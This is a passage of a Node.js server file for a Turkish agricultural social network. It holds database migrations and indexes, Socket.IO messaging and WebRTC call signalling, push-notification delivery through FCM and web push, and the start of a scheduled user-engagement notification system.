        // 🔧 Eski tablolarda eksik kolonları ekle (token kolonu yoksa ekle)
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS token TEXT`,
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS status TEXT NOT NULL DEFAULT 'pending'`,
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS name TEXT`,
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS surname TEXT`,
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS "frontImagePath" TEXT`,
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS "backImagePath" TEXT`,
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS "pdfPath" TEXT`,
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS "reviewedAt" TIMESTAMPTZ`,
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS "reviewNote" TEXT`,
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS "createdAt" TIMESTAMPTZ DEFAULT NOW()`,
        `ALTER TABLE verification_requests ADD COLUMN IF NOT EXISTS "updatedAt" TIMESTAMPTZ DEFAULT NOW()`,
        // token kolonu için unique index (eğer yoksa)
        `CREATE UNIQUE INDEX IF NOT EXISTS idx_verif_token_unique ON verification_requests(token) WHERE token IS NOT NULL`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "isVerified" BOOLEAN DEFAULT FALSE`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "privacyExtra" TEXT`,
        // ─── Partnerlik & İş Başvuruları Tablosu ───────────────────────
        `CREATE TABLE IF NOT EXISTS partnership_applications (
            id            TEXT PRIMARY KEY,
            "fullName"    TEXT NOT NULL,
            email         TEXT NOT NULL,
            phone         TEXT,
            "workField"   TEXT NOT NULL,
            message       TEXT,
            status        TEXT NOT NULL DEFAULT 'pending',
            "reviewNote"  TEXT,
            "reviewedAt"  TIMESTAMPTZ,
            "createdAt"   TIMESTAMPTZ DEFAULT NOW(),
            "updatedAt"   TIMESTAMPTZ DEFAULT NOW()
        )`,
    ];

    for (const migSql of columnMigrations) {
        try {
            await pool.query(migSql);
        } catch (e) {
            // Zaten varsa veya başka bir hata varsa sessizce geç
            console.warn(`⚠️ Migrasyon atlandı: ${e.message.split('\n')[0]}`);
        }
    }

    // ==================== İNDEKSLER ====================
    // Her index ayrı try-catch içinde — mevcut tablo şemasına göre hata atlarsa devam eder
    const indexes = [
        [`idx_posts_userId`,           `CREATE INDEX IF NOT EXISTS idx_posts_userId ON posts("userId")`],
        [`idx_posts_createdAt`,        `CREATE INDEX IF NOT EXISTS idx_posts_createdAt ON posts("createdAt" DESC)`],
        [`idx_posts_active`,           `CREATE INDEX IF NOT EXISTS idx_posts_active ON posts("isActive") WHERE "isActive" = TRUE`],
        [`idx_comments_postId`,        `CREATE INDEX IF NOT EXISTS idx_comments_postId ON comments("postId")`],
        [`idx_comments_userId`,        `CREATE INDEX IF NOT EXISTS idx_comments_userId ON comments("userId")`],
        [`idx_likes_postId`,           `CREATE INDEX IF NOT EXISTS idx_likes_postId ON likes("postId")`],
        [`idx_likes_userId`,           `CREATE INDEX IF NOT EXISTS idx_likes_userId ON likes("userId")`],
        [`idx_follows_followerId`,     `CREATE INDEX IF NOT EXISTS idx_follows_followerId ON follows("followerId")`],
        [`idx_follows_followingId`,    `CREATE INDEX IF NOT EXISTS idx_follows_followingId ON follows("followingId")`],
        [`idx_messages_senderId`,      `CREATE INDEX IF NOT EXISTS idx_messages_senderId ON messages("senderId")`],
        [`idx_messages_recipientId`,   `CREATE INDEX IF NOT EXISTS idx_messages_recipientId ON messages("recipientId")`],
        [`idx_messages_createdAt`,     `CREATE INDEX IF NOT EXISTS idx_messages_createdAt ON messages("createdAt" DESC)`],
        [`idx_notifications_userId`,   `CREATE INDEX IF NOT EXISTS idx_notifications_userId ON notifications("userId")`],
        [`idx_notifications_read`,     `CREATE INDEX IF NOT EXISTS idx_notifications_read ON notifications(read) WHERE read = FALSE`],
        [`idx_saves_userId`,           `CREATE INDEX IF NOT EXISTS idx_saves_userId ON saves("userId")`],
        [`idx_products_sellerId`,      `CREATE INDEX IF NOT EXISTS idx_products_sellerId ON products("sellerId")`],
        [`idx_stories_userId`,         `CREATE INDEX IF NOT EXISTS idx_stories_userId ON stories("userId")`],
        [`idx_stories_expiresAt`,      `CREATE INDEX IF NOT EXISTS idx_stories_expiresAt ON stories("expiresAt")`],
        [`idx_users_username`,         `CREATE INDEX IF NOT EXISTS idx_users_username ON users(username)`],
        [`idx_users_email`,            `CREATE INDEX IF NOT EXISTS idx_users_email ON users(email)`],
        [`idx_hashtags_tag`,           `CREATE INDEX IF NOT EXISTS idx_hashtags_tag ON hashtags(tag)`],
        [`idx_login_history_userId`,   `CREATE INDEX IF NOT EXISTS idx_login_history_userId ON login_history("userId")`],
        [`idx_refresh_tokens_userId`,  `CREATE INDEX IF NOT EXISTS idx_refresh_tokens_userId ON refresh_tokens("userId")`],
        [`idx_banned_ips_ip`,          `CREATE INDEX IF NOT EXISTS idx_banned_ips_ip ON banned_ips(ip)`],
        // ⚡ Performans indexleri — sorgu planı optimizasyonu
        // Feed sorgusu: createdAt + isActive birlikte sık kullanılıyor
        [`idx_posts_active_created`,   `CREATE INDEX IF NOT EXISTS idx_posts_active_created ON posts("isActive","createdAt" DESC) WHERE "isActive" = TRUE`],
        // Like/Save varlık kontrolü çok sık çalışır (feed'de her post için)
        [`idx_likes_post_user`,        `CREATE INDEX IF NOT EXISTS idx_likes_post_user ON likes("postId","userId")`],
        [`idx_saves_post_user`,        `CREATE INDEX IF NOT EXISTS idx_saves_post_user ON saves("postId","userId")`],
        // Block kontrolü — feed filtrelemede çift yönlü kontrol
        [`idx_blocks_blocker`,         `CREATE INDEX IF NOT EXISTS idx_blocks_blocker ON blocks("blockerId","blockedId")`],
        [`idx_blocks_blocked`,         `CREATE INDEX IF NOT EXISTS idx_blocks_blocked ON blocks("blockedId","blockerId")`],
        // ⚡ Feed (takip bazlı) için: followerId + followingId çifti — EXISTS subquery hızlandırır
        [`idx_follows_feed`,           `CREATE INDEX IF NOT EXISTS idx_follows_feed ON follows("followerId","followingId") INCLUDE ("followingId")`],
        // Follow kontrolü — isFollowing EXISTS için
        [`idx_follows_pair`,           `CREATE INDEX IF NOT EXISTS idx_follows_pair ON follows("followerId","followingId")`],
        // Message conversation: (senderId,receiverId,createdAt) birlikte sık
        [`idx_messages_conv`,          `CREATE INDEX IF NOT EXISTS idx_messages_conv ON messages("senderId","recipientId","createdAt" DESC)`],
        // Story expiry kontrolü — süresi dolmuş story'leri temizlemek için
        [`idx_stories_user_exp`,       `CREATE INDEX IF NOT EXISTS idx_stories_user_exp ON stories("userId","expiresAt")`],
        // Refresh token lookup — hash ile arama için
        [`idx_refresh_token_hash`,     `CREATE INDEX IF NOT EXISTS idx_refresh_token_hash ON refresh_tokens("tokenHash") WHERE "isActive" = TRUE`],
        // Notification okunmamış sayı — badge için
        [`idx_notif_unread`,           `CREATE INDEX IF NOT EXISTS idx_notif_unread ON notifications("userId",read,"createdAt" DESC) WHERE read = FALSE`],
        // Product search: category + isActive
        [`idx_products_cat_active`,    `CREATE INDEX IF NOT EXISTS idx_products_cat_active ON products(category,"isActive","createdAt" DESC) WHERE "isActive" = TRUE`],
    ];

    for (const [name, indexSql] of indexes) {
        try {
            await pool.query(indexSql);
        } catch (e) {
            console.warn(`⚠️ Index atlandı [${name}]: ${e.message.split('\n')[0]}`);
        }
    }

    // ── 📱 MOBİL: FCM Device Token tablosu ─────────────────────────────────
    await pool.query(`
        CREATE TABLE IF NOT EXISTS device_tokens (
            id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "userId"    UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            token       TEXT NOT NULL,
            platform    TEXT NOT NULL DEFAULT 'android',
            "isActive"  BOOLEAN NOT NULL DEFAULT TRUE,
            "createdAt" TIMESTAMPTZ DEFAULT NOW(),
            "updatedAt" TIMESTAMPTZ DEFAULT NOW(),
            UNIQUE(token)
        )
    `).catch(() => {});
    await pool.query(`CREATE INDEX IF NOT EXISTS idx_device_tokens_user ON device_tokens ("userId") WHERE "isActive" = TRUE`).catch(() => {});

    // ══════════════════════════════════════════════════════════════════════

    // 🔒 Token blacklist tablosu (cluster-safe logout)
    await pool.query(`
        CREATE TABLE IF NOT EXISTS blacklisted_tokens (
            "tokenHash" TEXT PRIMARY KEY,
            "expiresAt" TIMESTAMPTZ NOT NULL,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
    `);
    await pool.query(`CREATE INDEX IF NOT EXISTS idx_blacklist_expires ON blacklisted_tokens("expiresAt")`).catch(()=>{});

    console.log('✅ Tüm tablolar ve indeksler oluşturuldu (UUID)');
}

// ==================== EXPRESS UYGULAMASI ====================

const app = express();
// 🔒 Güvenli IP alma: sadece 1 seviye proxy güvenilir (Nginx/Cloudflare)
// Saldırgan X-Forwarded-For header'ı sahte yazamaz (proxy doğruluyor)
app.set('trust proxy', 1);
const server = http.createServer(app);
// 📱 Mobil büyük dosya yükleme desteği — timeout'ları artır
server.timeout = 5 * 60 * 1000;          // 5 dakika (büyük fotoğraf/video yükleme)
server.headersTimeout = 6 * 60 * 1000;   // headersTimeout > timeout olmalı
server.requestTimeout = 5 * 60 * 1000;   // istek timeout'u

// ══════════════════════════════════════════════════════════════════════════
// 🔌 SOCKET.IO — Gerçek zamanlı mesajlaşma, bildirimler, online durumu
// ══════════════════════════════════════════════════════════════════════════
// Bağlı kullanıcıların socket ID'lerini tutan harita: userId → Set<socketId>
const onlineUsers = new Map(); // userId (string) → Set<socketId>

if (socketIo) {
    io = new socketIo.Server(server, {
        cors: {
            origin: (origin, callback) => {
                // Native mobil (null origin) — X-Mobile-App-Key kontrolü (Socket.IO handshake'te header yoksa geç)
                // Native mobil bağlantı: JWT auth Socket.IO middleware'de yapılır
                if (!origin) return callback(null, true);
                if (
                    origin.startsWith('https://sehitumitkestitarimmtal.com') ||
                    origin.startsWith('http://sehitumitkestitarimmtal.com') ||
                    (_IS_PROD ? false : origin.startsWith('http://localhost')) ||
                    origin.startsWith('capacitor://') ||
                    origin.startsWith('ionic://') ||
                    origin.startsWith('android://') ||
                    (_IS_PROD ? false : origin.startsWith('http://10.0.2.2')) ||
                    (_IS_PROD ? false : origin.startsWith('exp://'))
                ) return callback(null, true);
                // .env APP_URL
                const appUrl = (process.env.APP_URL || '').replace(/\/$/, '');
                if (appUrl && origin.startsWith(appUrl)) return callback(null, true);
                console.warn(`[SOCKET.IO CORS] Reddedildi: ${origin}`);
                return callback(new Error('CORS: izin verilmedi'), false);
            },
            methods: ['GET', 'POST'],
            credentials: true,
        },
        transports: ['websocket', 'polling'],
        pingTimeout : 60000,
        pingInterval: 25000,
    });

    // ─── Socket.IO kimlik doğrulama middleware ────────────────────────────
    io.use(async (socket, next) => {
        try {
            const token = socket.handshake.auth?.token ||
                          socket.handshake.headers?.authorization?.split(' ')[1] ||
                          socket.handshake.query?.token;
            if (!token) return next(new Error('Token gerekli'));
            const decoded = jwt.verify(token, JWT_SECRET, {
                algorithms : ['HS256'],
                audience   : 'agrolink-client',
                issuer     : 'agrolink',
            });
            const user = await dbGet(
                `SELECT id, username, name, "profilePic", role FROM users WHERE id = $1 AND "isActive" = TRUE`,
                [decoded.id]
            );
            if (!user) return next(new Error('Kullanıcı bulunamadı'));
            socket.userId   = user.id;
            socket.username = user.username;
            socket.user     = user;
            next();
        } catch (e) {
            next(new Error('Geçersiz token'));
        }
    });

    // ─── Socket.IO olayları ───────────────────────────────────────────────
    io.on('connection', (socket) => {
        const userId = socket.userId;
        console.log(`🔌 [SOCKET] Bağlandı: ${socket.username} (${userId}) socketId=${socket.id}`);

        // Online kullanıcı kaydı
        if (!onlineUsers.has(userId)) onlineUsers.set(userId, new Set());
        onlineUsers.get(userId).add(socket.id);

        // DB'de online durumunu güncelle
        dbRun(`UPDATE users SET "isOnline" = TRUE, "lastSeenAt" = NOW() WHERE id = $1`, [userId]).catch(() => {});

        // Herkese bu kullanıcının online olduğunu bildir
        socket.broadcast.emit('user:online', { userId });

        // ── Mesaj gönderme (mobil & web) ─────────────────────────────────
        // 🔒 FIX 2: Socket.IO rate limit — kullanıcı başına mesaj hız sınırı
        const socketMsgCounters = new Map(); // userId → { count, reset }
        const SOCKET_MSG_LIMIT = 30;         // 60 saniyede max 30 mesaj
        const SOCKET_WINDOW_MS = 60 * 1000;

        socket.on('message:send', async (data) => {
            try {
                const { receiverId, content, mediaUrl, mediaType, tempId } = data;
                // Sesli/medya mesajlar içerik olmadan gönderilebilir
                if (!receiverId) return;
                if (!content?.trim() && !mediaUrl) return; // ya metin ya medya zorunlu

                // 🔒 Rate limit kontrolü
                const now = Date.now();
                const counter = socketMsgCounters.get(userId) || { count: 0, reset: now + SOCKET_WINDOW_MS };
                if (now > counter.reset) { counter.count = 0; counter.reset = now + SOCKET_WINDOW_MS; }
                counter.count++;
                socketMsgCounters.set(userId, counter);
                if (counter.count > SOCKET_MSG_LIMIT) {
                    socket.emit('message:error', { error: 'Çok hızlı mesaj gönderiyorsunuz, lütfen bekleyin.' });
                    return;
                }

                // 🔒 Mesaj boyutu kontrolü — DB şişirmesi önlemi
                const MAX_MSG_LEN = 5000;
                const safeContent = content.trim().slice(0, MAX_MSG_LEN);
                if (!safeContent) return;

                // 🔒 mediaUrl whitelist — sadece kendi sunucusu veya null
                const APP_ORIGIN = (process.env.APP_URL || '').replace(/\/$/, '');
                const safeMediaUrl = (mediaUrl && typeof mediaUrl === 'string' &&
                    (mediaUrl.startsWith('/uploads/') || (APP_ORIGIN && mediaUrl.startsWith(APP_ORIGIN))))
                    ? mediaUrl : null;

                const ALLOWED_MEDIA = ['image', 'video', 'audio', 'voice', null, undefined];
                const safeMediaType = ALLOWED_MEDIA.includes(mediaType) ? mediaType : null;

                const msgId = uuidv4();
                await dbRun(
                    `INSERT INTO messages (id, "senderId", "receiverId", content, "mediaUrl", "mediaType", "createdAt")
                     VALUES ($1, $2, $3, $4, $5, $6, NOW())`,
                    [msgId, userId, receiverId, safeContent, safeMediaUrl, safeMediaType]
                );

                const newMsg = {
                    id         : msgId,
                    senderId   : userId,
                    receiverId,
                    content    : safeContent,
                    mediaUrl   : safeMediaUrl,
                    mediaType  : safeMediaType,
                    createdAt  : new Date().toISOString(),
                    tempId     : tempId || null,
                };

                // Alıcı online ise socket üzerinden gönder
                if (onlineUsers.has(receiverId)) {
                    for (const sid of onlineUsers.get(receiverId)) {
                        io.to(sid).emit('message:receive', newMsg);
                    }
                }

                // Gönderene onay (tempId → gerçek id eşleşmesi)
                socket.emit('message:sent', newMsg);

                // Push bildirim: alıcı online olsa bile web push + FCM göndер
                // (web push: tarayıcı kapalıysa/arka plandaysa çalışır; online kontrolü webpush kütüphanesi yapar)
                const pushPayload = {
                    title: socket.user?.name || socket.username,
                    body : safeContent.substring(0, 100),
                    url  : '/',
                };
                // Web Push (VAPID) — alıcının tarayıcı aboneliği varsa her durumda gönder
                sendPushToUser(receiverId, pushPayload).catch(() => {});

                // FCM push bildirimi (alıcı offline ise)
                if (!onlineUsers.has(receiverId)) {
                    sendFcmPush(receiverId, {
                        title: socket.user?.name || socket.username,
                        body : safeContent.substring(0, 100),
                        data : {
                            type           : 'message',
                            url            : '/',
                            senderId       : userId,
                            messageId      : msgId,
                            actorName      : socket.user?.name || socket.username,
                            actorUsername  : socket.username,
                            actorProfilePic: absoluteUrl(socket.user?.profilePic || ''),
                            messagePreview : safeContent.substring(0, 100),
                        },
                    }).catch(() => {});
                }
            } catch (e) {
                console.error('[SOCKET message:send]', e);
                socket.emit('message:error', { error: 'Mesaj gönderilemedi' });
            }
        });

        // ── Yazıyor göstergesi ────────────────────────────────────────────
        socket.on('message:typing', ({ receiverId, isTyping }) => {
            if (!receiverId) return;
            if (onlineUsers.has(receiverId)) {
                for (const sid of onlineUsers.get(receiverId)) {
                    io.to(sid).emit('message:typing', { senderId: userId, isTyping: !!isTyping });
                }
            }
        });

        // ── Mesaj okundu ──────────────────────────────────────────────────
        socket.on('message:read', async ({ senderId }) => {
            try {
                await dbRun(
                    `UPDATE messages SET "isRead" = TRUE, "readAt" = NOW()
                     WHERE "senderId" = $1 AND "receiverId" = $2 AND "isRead" = FALSE`,
                    [senderId, userId]
                );
                // Gönderene okundu bilgisi
                if (onlineUsers.has(senderId)) {
                    for (const sid of onlineUsers.get(senderId)) {
                        io.to(sid).emit('message:read', { readBy: userId });
                    }
                }
            } catch (e) { /* ignore */ }
        });

        // ── Post beğeni (anlık güncelleme) ────────────────────────────────
        socket.on('post:like', ({ postId, count }) => {
            socket.broadcast.emit('post:like:update', { postId, count, userId });
        });

        // ══════════════════════════════════════════════════════════════════
        // ── Bağlantı kesildi ─────────────────────────────────────────────
        // ═══════════════════════════════════════════════════
        // 📹 GÖRÜNTÜLÜ / SESLİ ARAMA — WebRTC Sinyal Köprüsü
        // ═══════════════════════════════════════════════════

        // Aktif aramalar takibi (callId → { callerId, recipientId, type, startTime })
        const activeCalls = new Map();

        // Arama başlat
        socket.on('call:initiate', async ({ recipientId, type, callId }) => {
            try {
                if (!recipientId || !callId) return;
                const caller = {
                    id        : userId,
                    name      : socket.user.name,
                    username  : socket.username,
                    profilePic: absoluteUrl(socket.user.profilePic || ''),
                };
                const recipientSockets = onlineUsers.get(recipientId);

                if (!recipientSockets || recipientSockets.size === 0) {
                    socket.emit('call:error', { callId, error: 'Kullanıcı çevrimdışı', code: 'USER_OFFLINE' });
                    // FCM ile çevrimdışı push gönder (missed call)
                    sendFcmPush(recipientId, {
                        title: caller.name || caller.username,
                        body : `📞 ${type === 'audio' ? 'Sesli' : 'Görüntülü'} arama cevapsız kaldı`,
                        data : { type: 'missed_call', callerId: userId, callType: type || 'video', actorName: caller.name || caller.username, actorUsername: caller.username, actorProfilePic: caller.profilePic },
                    }).catch(() => {});
                    return;
                }

                // Çağrıyı kaydet
                activeCalls.set(callId, { callerId: userId, recipientId, type: type || 'video', startTime: Date.now() });

                // Alıcıya çağrı bildirimi gönder (TÜM socketlerine)
                recipientSockets.forEach(sid => {
                    io.to(sid).emit('incoming_call', {
                        callId,
                        caller,
                        type  : type || 'video',
                        timestamp: Date.now(),
                    });
                });

                socket.emit('call:ringing', { callId, recipientId });
                console.log(`📞 [CALL] ${caller.username} → ${recipientId} | type: ${type || 'video'} | callId: ${callId}`);

                // 30 saniye içinde cevap gelmezse timeout
                setTimeout(() => {
                    const call = activeCalls.get(callId);
                    if (call && call.callerId === userId) {
                        activeCalls.delete(callId);
                        socket.emit('call:timeout', { callId });
                        recipientSockets.forEach(sid => io.to(sid).emit('call:cancelled', { callId }));
                    }
                }, 30000);

            } catch (e) {
                console.error('[SOCKET call:initiate]', e);
                socket.emit('call:error', { callId, error: 'Arama başlatılamadı' });
            }
        });

        // Aramayı yanıtla (kabul / red)
        socket.on('call:respond', ({ callId, callerId, response }) => {
            const callerSockets = onlineUsers.get(callerId);
            if (callerSockets) {
                const event = response === 'accept' ? 'call_accepted' : 'call_rejected';
                callerSockets.forEach(sid => io.to(sid).emit(event, { callId, responderId: userId }));
            }
            if (response === 'accept') {
                socket.emit('call:accepted', { callId });
                console.log(`📞 [CALL] Kabul: callId=${callId}`);
            } else {
                activeCalls.delete(callId);
                console.log(`📞 [CALL] Red: callId=${callId}`);
            }
        });

        // Aramayı bitir
        socket.on('call:end', ({ callId, recipientId: targetId }) => {
            activeCalls.delete(callId);
            const targetSockets = onlineUsers.get(targetId);
            if (targetSockets) targetSockets.forEach(sid => io.to(sid).emit('call_ended', { callId, endedBy: userId }));
            socket.emit('call_ended', { callId });
            console.log(`📞 [CALL] Bitti: callId=${callId}`);
        });

        // WebRTC: Offer ilet
        socket.on('webrtc_offer', ({ callId, recipientId, offer }) => {
            const recipientSockets = onlineUsers.get(recipientId);
            if (recipientSockets) {
                recipientSockets.forEach(sid => io.to(sid).emit('webrtc_offer', { callId, callerId: userId, offer }));
            }
        });

        // WebRTC: Answer ilet
        socket.on('webrtc_answer', ({ callId, recipientId, answer }) => {
            const recipientSockets = onlineUsers.get(recipientId);
            if (recipientSockets) {
                recipientSockets.forEach(sid => io.to(sid).emit('webrtc_answer', { callId, answer }));
            }
        });

        // WebRTC: ICE Candidate ilet
        socket.on('webrtc_ice_candidate', ({ callId, recipientId, candidate }) => {
            const recipientSockets = onlineUsers.get(recipientId);
            if (recipientSockets) {
                recipientSockets.forEach(sid => io.to(sid).emit('webrtc_ice_candidate', { callId, candidate }));
            }
        });

        socket.on('disconnect', () => {
            console.log(`🔌 [SOCKET] Ayrıldı: ${socket.username} (${userId})`);
            const sockets = onlineUsers.get(userId);
            if (sockets) {
                sockets.delete(socket.id);
                if (sockets.size === 0) {
                    onlineUsers.delete(userId);
                    dbRun(`UPDATE users SET "isOnline" = FALSE, "lastSeenAt" = NOW() WHERE id = $1`, [userId]).catch(() => {});
                    socket.broadcast.emit('user:offline', { userId });
                }
            }
        });
    });

    console.log('✅ Socket.IO başlatıldı (gerçek zamanlı mesajlaşma & bildirimler aktif)');
}

// ══════════════════════════════════════════════════════════════════════════

// 🔒 LOG GÜVENLİĞİ: E-posta adreslerini logda maskele (user@domain → us**@domain)
function maskEmail(email) {
    if (!email || typeof email !== 'string') return '[email]';
    const [local, domain] = email.split('@');
    if (!domain) return '***';
    const masked = local.length <= 2 ? '**' : local.slice(0, 2) + '*'.repeat(Math.min(local.length - 2, 4));
    return `${masked}@${domain}`;
}
// 🔔 FCM PUSH BİLDİRİM YARDIMCI FONKSİYONU
// ══════════════════════════════════════════════════════════════════════════
async function sendFcmPush(userId, { title, body, data = {} }) {
    // ── Web Push (VAPID) — platform='web' tokenları için ───────────────────
    // FCM Admin olmasa bile web push çalışabilir
    if (webpush && process.env.VAPID_PUBLIC_KEY) {
        try {
            const webRows = await dbAll(
                `SELECT token, platform FROM device_tokens WHERE "userId" = $1 AND "isActive" = TRUE AND platform = 'web'`,
                [userId]
            ).catch(() => []);
            for (const row of webRows) {
                try {
                    // Web token formatı: JSON string olarak saklanır { endpoint, keys: { p256dh, auth } }
                    let sub;
                    try { sub = JSON.parse(row.token); } catch(_) { continue; }
                    if (!sub?.endpoint) continue;
                    // url top-level'da olmalı — Service Worker notificationclick handler bunu okur
                    const notifUrl = data?.url
                        ? (data.url.startsWith('http') ? data.url : APP_URL + data.url)
                        : APP_URL;
                    const payload = JSON.stringify({ title, body, icon: '/agro.png', url: notifUrl, data, timestamp: Date.now() });
                    await webpush.sendNotification(sub, payload).catch(async (err) => {
                        if (err.statusCode === 410 || err.statusCode === 404) {
                            await dbRun(`UPDATE device_tokens SET "isActive" = FALSE WHERE token = $1`, [row.token]).catch(() => {});
                        }
                    });
                } catch(_) {}
            }
        } catch(_) {}
    }

    if (!firebaseAdmin) {
        // Sadece web push varsa sessizce dön — FCM uyarısını web-only senaryoda bastır
        if (!webpush) console.warn('[FCM] firebaseAdmin null — FIREBASE_SERVICE_ACCOUNT_JSON .env\'de tanımlı mı?');
        return;
    }
    try {
        // Kullanıcının kayıtlı FCM token'larını al — android, ios ve web (FCM Web token)
        // platform='web' olanlar içinde FCM token (firebase SDK registration token) olabilir,
        // bunlar VAPID sub değil — platform whitelist ile ayırt et
        const rows = await dbAll(
            `SELECT token, platform FROM device_tokens
             WHERE "userId" = $1 AND "isActive" = TRUE
               AND platform IN ('android', 'ios', 'web_fcm')`,
            [userId]
        );
        if (!rows || rows.length === 0) return;

        const tokens = rows.map(r => r.token).filter(Boolean);
        if (tokens.length === 0) return;

        // data alanındaki tüm değerleri string'e çevir (FCM zorunluluğu)
        const safeData = Object.fromEntries(
            Object.entries(data).map(([k, v]) => [k, String(v ?? '')])
        );

        // platform listesine göre per-token mesajlar oluştur
        // sendEachForMulticast tek bir mesajı tüm tokenlara gönderir —
        // platform spesifik bloklar (android/apns/webpush) FCM tarafında
        // ilgili token'ın platform'una göre otomatik uygulanır
        const message = {
            notification: { title, body },
            data: safeData,
            tokens,
            // ── Android: yüksek öncelik + bildirim kanalı ──────────────
            android: {
                priority: 'high',
                notification: {
                    title,
                    body,
                    channelId: 'agrolink_notifications',
                    sound: 'default',
                    clickAction: 'FLUTTER_NOTIFICATION_CLICK',
                },
            },
            // ── APNs (iOS) ──────────────────────────────────────────────
            apns: {
                payload: {
                    aps: {
                        alert: { title, body },
                        sound: 'default',
                        badge: 1,
                    },
                },
                headers: { 'apns-priority': '10' },
            },
            // ── FCM Web Push (web_fcm platform) ────────────────────────
            webpush: {
                notification: {
                    title,
                    body,
                    icon: '/agro.png',
                    badge: '/agro.png',
                    requireInteraction: false,
                },
                fcmOptions: {
                    // FCM webpush.fcmOptions.link mutlaka absolute URL olmalı
                    link: data.url
                        ? (data.url.startsWith('http') ? data.url : APP_URL + (data.url.startsWith('/') ? data.url : '/' + data.url))
                        : APP_URL,
                },
            },
        };

        const response = await firebaseAdmin.messaging().sendEachForMulticast(message);

        // Sonuçları logla
        const successCount = response.responses.filter(r => r.success).length;
        const failCount    = response.responses.filter(r => !r.success).length;
        if (failCount > 0) {
            console.warn(`[FCM] userId=${userId} → ${successCount} başarılı, ${failCount} başarısız`);
        }

        // Geçersiz token'ları temizle
        response.responses.forEach((r, i) => {
            if (!r.success) {
                const code = r.error?.code || '';
                console.warn(`[FCM] Token hatası [${i}]: ${code} — ${r.error?.message || ''}`);
                if (
                    code === 'messaging/invalid-registration-token' ||
                    code === 'messaging/registration-token-not-registered' ||
                    code === 'messaging/unregistered'
                ) {
                    dbRun(`UPDATE device_tokens SET "isActive" = FALSE WHERE token = $1`, [tokens[i]]).catch(() => {});
                }
            }
        });
    } catch (e) {
        console.error('[FCM Push Error]', e.message, e.stack?.split('\n')[1] || '');
    }
}

// ════════════════════════════════════════════════════════════════════════════
// 🔔 AKILLI BİLDİRİM SİSTEMİ — Zaman Bazlı, Gerçek Veriye Dayalı
// ════════════════════════════════════════════════════════════════════════════
//
//  KURULUM: npm install node-cron
//  .env:    SMART_NOTIF_ENABLED=true
//
//  Segmentler:  🟢 Aktif (≤2 gün)  🟡 Orta (3-7 gün)  🔴 Pasif (8-30 gün)
//  Kampanyalar: morning | noon | evening | night | serial_1 | serial_2 | serial_3
//
// ════════════════════════════════════════════════════════════════════════════

let cron = null;
try {
    cron = require('node-cron');
    console.log('✅ node-cron yüklendi — Akıllı Bildirim Sistemi aktif');
} catch (_) {
    console.warn('⚠️  node-cron bulunamadı. (npm install node-cron)');
}

// ── Kullanıcı segmentini belirle ─────────────────────────────────────────────
// Dönüş: 'active' | 'medium' | 'passive' | 'dormant'
async function getUserSegment(userId) {
    try {
        const r = await dbAll(
            `SELECT "lastLogin" FROM users WHERE id=$1 AND "isActive"=TRUE AND "isBanned"=FALSE`,
            [userId]
        );
        if (!r || r.length === 0) return 'dormant';
        const last = r[0].lastLogin;
        if (!last) return 'dormant';
        const daysSince = (Date.now() - new Date(last).getTime()) / (1000 * 60 * 60 * 24);
        if (daysSince <= 2)  return 'active';
        if (daysSince <= 7)  return 'medium';
        if (daysSince <= 30) return 'passive';
        return 'dormant';
    } catch (_) { return 'dormant'; }
}

// ── Kullanıcının tipik giriş saatini hesapla ─────────────────────────────────
// Son 7 günün giriş saatlerinin modunu alır → en sık kullandığı saat
// Veri yoksa null döner (global schedule kullanılır)
async function getUserTypicalHour(userId) {
    try {
        const rows = await dbAll(
            `SELECT hour, COUNT(*) as cnt
             FROM user_login_hours
             WHERE "userId"=$1 AND "loggedAt" > NOW() - INTERVAL '14 days'
             GROUP BY hour ORDER BY cnt DESC LIMIT 1`,
            [userId]
        );
        if (!rows || rows.length === 0) return null;
        return parseInt(rows[0].hour);
    } catch (_) { return null; }
}

// ── Gün içi gerçek trend içerik al ──────────────────────────────────────────
// Bugünün en çok beğenilen/yorum alan postunu getirir
async function getTodayTrendingPost() {
    try {
        const rows = await dbAll(`
            SELECT p.id, p.content,
                   u.name as "authorName",
                   COALESCE(p."likeCount",0) + COALESCE(p."commentCount",0)*2 AS score
            FROM posts p
            JOIN users u ON u.id = p."userId"
            WHERE p."createdAt" > NOW() - INTERVAL '24 hours'
              AND p."isActive" = TRUE
              AND p.content IS NOT NULL
              AND length(p.content) > 10
            ORDER BY score DESC
            LIMIT 1
        `);
        return rows && rows.length > 0 ? rows[0] : null;
    } catch (_) { return null; }
}

// Bugünkü en aktif konu kategorisini getirir (en çok post atılan)
async function getTodayTopCategory() {
    try {
        const rows = await dbAll(`
            SELECT category, COUNT(*) as cnt
            FROM posts
            WHERE "createdAt" > NOW() - INTERVAL '24 hours'
              AND "isActive" = TRUE
              AND category IS NOT NULL
            GROUP BY category
            ORDER BY cnt DESC
            LIMIT 1
        `);
        return rows && rows.length > 0 ? rows[0].category : null;
    } catch (_) { return null; }
}

// Son 1 saatteki yorum sayısını getir (trend kontrol)
async function getRecentCommentCount() {
    try {
        const rows = await dbAll(
            `SELECT COUNT(*) as cnt FROM comments WHERE "createdAt" > NOW() - INTERVAL '1 hour'`
        );
        return rows && rows.length > 0 ? parseInt(rows[0].cnt) : 0;
    } catch (_) { return 0; }
}

// Bugün pazaryerine eklenen ürün sayısı
async function getTodayMarketplaceCount() {
    try {
        const rows = await dbAll(
            `SELECT COUNT(*) as cnt FROM marketplace_items WHERE "createdAt" > NOW() - INTERVAL '24 hours' AND status='active'`
        ).catch(() => null);
        return rows && rows.length > 0 ? parseInt(rows[0].cnt) : 0;
    } catch (_) { return 0; }
}

// Şu an online kullanıcı sayısı
async function getOnlineUserCount() {
    try {
        const rows = await dbAll(
            `SELECT COUNT(*) as cnt FROM users WHERE "isOnline"=TRUE AND "isActive"=TRUE`
        );
